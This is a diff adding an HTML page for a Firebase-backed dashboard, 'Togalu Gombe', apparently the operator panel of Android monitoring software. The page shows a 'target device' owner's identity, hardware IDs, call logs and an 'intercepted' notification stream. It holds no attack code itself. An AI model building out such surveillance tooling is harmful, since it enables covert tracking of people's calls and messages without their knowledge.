@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Togalu Gombe - Device Details</title>
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800&display=swap" rel="stylesheet">
+    
+    <!-- Stylesheets -->
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="css/pages.css">
+
+    <!-- Firebase Compat SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+    
+    <!-- ChartJS for visual analytics charts -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+</head>
+<body>
+
+    <div class="glass-glow-bg glow-1"></div>
+    <div class="glass-glow-bg glow-2"></div>
+
+    <div class="app-container">
+        <!-- Sidebar Navigation -->
+        <aside class="sidebar">
+            <div class="brand">
+                <span class="brand-icon">🎭</span>
+                <span class="brand-name">Togalu Gombe</span>
+            </div>
+            
+            <nav class="nav-menu">
+                <li class="nav-item"><a href="index.html"><span>🏠</span> Dashboard</a></li>
+                <li class="nav-item"><a href="users.html"><span>👥</span> Devices Directory</a></li>
+                <li class="nav-item"><a href="analytics.html"><span>📊</span> Global Analytics</a></li>
+            </nav>
+
+            <div class="sidebar-footer">
+                <button class="btn-logout" id="btnLogout">Logout</button>
+            </div>
+        </aside>
+
+        <!-- Main Content area -->
+        <main class="content-viewport">
+            <header class="content-header" style="margin-bottom: 20px;">
+                <div>
+                    <button class="btn-action" onclick="window.location.href='users.html'" style="margin-bottom: 12px;">
+                        ← Back to Directory
+                    </button>
+                    <h1 class="page-title">Device Telemetry Inspector</h1>
+                    <p class="page-subtitle">Granular logs details captured from this target device.</p>
+                </div>
+            </header>
+
+            <div class="tab-header">
+                <button class="tab-btn active" data-tab="tab-profile">User Profile</button>
+                <button class="tab-btn" data-tab="tab-device">Device Hardware</button>
+                <button class="tab-btn" data-tab="tab-calls">Call Logs</button>
+                <button class="tab-btn" data-tab="tab-notifications">Notification Timeline</button>
+                <button class="tab-btn" data-tab="tab-analytics">Usage Analytics</button>
+                <button class="tab-btn" data-tab="tab-sync">Data Sync History</button>
+                <button class="tab-btn" data-tab="tab-heartbeat">Heartbeat Logs</button>
+            </div>
+
+            <!-- Tab: Profile -->
+            <section class="glass-card tab-pane active" id="tab-profile">
+                <h3 style="margin-bottom: 20px;">Owner Identity Parameters</h3>
+                <div class="details-grid">
+                    <div class="info-item">
+                        <div class="info-label">Account Email</div>
+                        <div class="info-val" id="profEmail">Loading...</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="info-label">User Firebase ID (UID)</div>
+                        <div class="info-val" id="profUid" style="font-family: monospace;">Loading...</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="info-label">Account Created At</div>
+                        <div class="info-val" id="profRegTime">Loading...</div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tab: Device Info -->
+            <section class="glass-card tab-pane" id="tab-device">
+                <h3 style="margin-bottom: 20px;">Hardware Specifications</h3>
+                <div class="details-grid">
+                    <div class="info-item">
+                        <div class="info-label">Device Manufacturer</div>
+                        <div class="info-val" id="devManufacturer">Loading...</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="info-label">Model Name</div>
+                        <div class="info-val" id="devModel">Loading...</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="info-label">Device Unique Identifier</div>
+                        <div class="info-val" id="devId" style="font-family: monospace;">Loading...</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="info-label">Android OS Build</div>
+                        <div class="info-val" id="devAndroid">Loading...</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="info-label">App version Installed</div>
+                        <div class="info-val" id="devAppVer">Loading...</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="info-label">Client Registration Timestamp</div>
+                        <div class="info-val" id="devRegTime">Loading...</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="info-label">Last telemetry Sync status</div>
+                        <div class="info-val" id="devLastActive">Loading...</div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tab: Call Logs -->
+            <section class="glass-card tab-pane" id="tab-calls">
+                <div class="filter-row">
+                    <h3 style="margin-right: auto;">Call History Logs</h3>
+                    <select class="filter-input" id="filterCallType">
+                        <option value="ALL">All Call Types</option>
+                        <option value="INCOMING">Incoming</option>
+                        <option value="OUTGOING">Outgoing</option>
+                        <option value="MISSED">Missed</option>
+                    </select>
+                    <input class="filter-input" type="text" id="searchCallNumber" placeholder="Search number...">
+                </div>
+
+                <div class="table-container">
+                    <table class="custom-table">
+                        <thead>
+                            <tr>
+                                <th>Call Type</th>
+                                <th>Number</th>
+                                <th>Duration</th>
+                                <th>Timestamp</th>
+                            </tr>
+                        </thead>
+                        <tbody id="callsBody">
+                            <tr>
+                                <td colspan="4" class="loading-indicator">No calls tracked.</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Tab: Notifications -->
+            <section class="glass-card tab-pane" id="tab-notifications">
+                <h3 style="margin-bottom: 20px;">Intercepted Notification Stream</h3>
+                <div id="notifTimeline">
+                    <div class="loading-indicator">No notifications synced.</div>
+                </div>
+            </section>
+
+            <!-- Tab: Analytics -->
+            <section class="tab-pane" id="tab-analytics">
+                <div class="charts-grid">
+                    <div class="glass-card">
+                        <h3 style="margin-bottom: 20px; text-align: center;">Calls Type Breakdown</h3>
+                        <div class="chart-container">
+                            <canvas id="callPieChart" class="chart-canvas"></canvas>
+                        </div>
+                    </div>
+                    
+                    <div class="glass-card">
+                        <h3 style="margin-bottom: 20px; text-align: center;">Top Notifications Apps</h3>
+                        <div class="chart-container">
+                            <canvas id="appBarChart" class="chart-canvas"></canvas>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tab: Sync History -->
+            <section class="glass-card tab-pane" id="tab-sync">
+                <h3 style="margin-bottom: 20px;">Local Sync Transactions</h3>
+                <div class="table-container">
+                    <table class="custom-table">
+                        <thead>
+                            <tr>
+                                <th>Synchronization time</th>
+                                <th>Status code</th>
+                                <th>Data packets synced</th>
+                            </tr>
+                        </thead>
+                        <tbody id="syncLogsBody">
+                            <tr>
+                                <td colspan="3" class="loading-indicator">No sync activities tracked.</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Tab: Heartbeat Logs -->
+            <section class="glass-card tab-pane" id="tab-heartbeat">
+                <h3 style="margin-bottom: 20px;">Periodic Background Checks (0 items)</h3>
+                <div class="table-container">
+                    <table class="custom-table">
+                        <thead>
+                            <tr>
+                                <th>Check-in Time</th>
+                                <th>Status code</th>
+                                <th>Data packets synced</th>
+                            </tr>
+                        </thead>
+                        <tbody id="heartbeatLogsBody">
+                            <tr>
+                                <td colspan="3" class="loading-indicator">No periodic checks tracked.</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+
+        </main>
+    </div>
+
+    <!-- Core App JS -->
+    <script src="js/app.js"></script>
+    <script src="js/details.js"></script>
+    <script src="js/analytics.js"></script>
+</body>
+</html>
